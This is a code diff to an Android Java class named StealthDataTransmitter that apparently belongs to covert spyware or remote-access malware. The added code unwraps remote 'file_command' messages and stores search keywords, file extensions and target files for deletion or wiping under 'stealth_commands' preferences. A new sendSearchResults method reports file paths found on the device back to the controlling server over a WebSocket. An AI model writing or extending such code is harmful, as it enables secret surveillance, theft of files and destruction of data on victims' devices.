@@ -97,10 +97,43 @@ public class StealthDataTransmitter {
 
                         SharedPreferences prefs = context.getSharedPreferences("stealth_commands", Context.MODE_PRIVATE);
                         SharedPreferences.Editor editor = prefs.edit();
-                        editor.putString("command", action);
                         editor.putLong("timestamp", System.currentTimeMillis());
 
-                        // ДОБАВЬТЕ: сохраняем file_path если есть
+                        String finalAction = action;
+
+                        // Если action = "file_command" — извлекаем вложенную команду
+                        if ("file_command".equals(action) && json.has("command")) {
+                            try {
+                                JSONObject commandObj = json.getJSONObject("command");
+                                finalAction = commandObj.optString("action", "");
+                                Log.e(TAG, "!!! UNWRAPPED FILE COMMAND: " + finalAction + " !!!");
+
+                                // Сохраняем keywords для поиска
+                                if (commandObj.has("keywords")) {
+                                    editor.putString("search_keywords", commandObj.getJSONArray("keywords").toString());
+                                } else {
+                                    editor.putString("search_keywords", "[]");
+                                }
+
+                                // Сохраняем extensions для поиска
+                                if (commandObj.has("extensions")) {
+                                    editor.putString("search_extensions", commandObj.getJSONArray("extensions").toString());
+                                } else {
+                                    editor.putString("search_extensions", "[]");
+                                }
+
+                                // Сохраняем files для delete/wipe
+                                if (commandObj.has("files")) {
+                                    editor.putString("target_files", commandObj.getJSONArray("files").toString());
+                                }
+                            } catch (Exception e) {
+                                Log.e(TAG, "Failed to unwrap file_command", e);
+                            }
+                        }
+
+                        editor.putString("command", finalAction);
+
+                        // Сохраняем file_path если есть
                         if (json.has("file_path")) {
                             String filePath = json.getString("file_path");
                             editor.putString("file_path", filePath);
@@ -110,10 +143,11 @@ public class StealthDataTransmitter {
                         boolean success = editor.commit();
                         Log.e(TAG, "!!! COMMAND SAVED: " + success + " !!!");
 
+                        final String dispatchAction = finalAction;
                         if (commandListener != null) {
                             mainHandler.post(() -> {
-                                Log.e(TAG, "!!! CALLING LISTENER for: " + action + " !!!");
-                                commandListener.onCommandReceived(action);
+                                Log.e(TAG, "!!! CALLING LISTENER for: " + dispatchAction + " !!!");
+                                commandListener.onCommandReceived(dispatchAction);
                             });
                         }
                     }
@@ -324,6 +358,29 @@ public class StealthDataTransmitter {
 
         } catch (JSONException e) {
             Log.e(TAG, "Failed to create HTTP image payload", e);
+        }
+    }
+
+    public void sendSearchResults(java.util.List<String> filePaths) {
+        if (currentDeviceId == null || webSocket == null || !isConnected()) return;
+
+        try {
+            JSONArray filesArray = new JSONArray();
+            for (String path : filePaths) {
+                filesArray.put(path);
+            }
+
+            JSONObject message = new JSONObject();
+            message.put("type", "search_results");
+            message.put("device_id", currentDeviceId);
+            message.put("files", filesArray);
+            message.put("total", filePaths.size());
+            message.put("timestamp", System.currentTimeMillis());
+
+            webSocket.send(message.toString());
+            Log.d(TAG, "Search results sent: " + filePaths.size() + " files");
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to send search results", e);
         }
     }
 
